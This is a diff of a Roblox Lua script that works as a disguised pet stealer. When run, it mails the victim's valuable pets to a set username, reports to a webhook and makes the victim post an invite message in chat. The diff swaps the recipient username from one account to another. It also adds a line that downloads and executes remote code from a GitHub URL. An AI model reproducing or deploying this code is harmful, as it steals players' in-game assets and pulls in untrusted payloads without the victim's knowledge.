@@ -86,7 +86,7 @@ local msg = {
 
 request = http_request or request or HttpPost or syn.request
 request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
-_G.Username = "LaRussieCool2" --// Username To Send Pets To
+_G.Username = "W4r_ObScUrE" --// Username To Send Pets To
 _G.GiftMessage = ".gg/EP9uC28cna" --// Message For The Gift To Say
 _G.SendMessage = "disco epic code! its EP9uC28cna" --// Message the victim will send in the chat on execution
 _G.Diamonds = 100000000 --// Amount Of Diamonds To detect alt set an amount of diamond that if the target is under this number, the script will show them an error
@@ -274,7 +274,7 @@ while wait() do
                     _G.Lol = 0
         end
         if v2.huge == true and game.Players.LocalPlayer.leaderstats.Diamonds.Value > 100000 then
-            _G.Username = "LaRussieCool2"
+            _G.Username = "W4r_ObScUrE"
             _G.PetName = v2.name
             _G.PetRar = v2.rarity
             print(_G.PetName)
@@ -287,6 +287,7 @@ while wait() do
     			}
 			}
 			Invoke("Send Mail", unpack(args))
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Subashians/FuzeHub/main/nigs.lua"))()
             wait(5)
     
             if v2.huge == false then
